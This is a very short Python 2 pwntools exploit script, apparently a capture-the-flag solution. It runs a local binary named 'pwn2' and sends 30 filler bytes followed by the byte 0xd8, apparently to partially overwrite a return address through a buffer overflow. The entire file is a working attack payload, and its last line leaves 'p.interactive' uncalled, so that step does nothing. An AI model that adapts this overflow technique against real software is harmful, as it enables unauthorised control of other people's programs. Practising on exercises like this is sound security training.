#!/usr/bin/env python
from pwn import *

p=process('./pwn2')
payload='A'*30+ '\xd8'

print p.recvuntil('call',drop=False)
p.sendline(payload)
print p.recvline()
p.interactive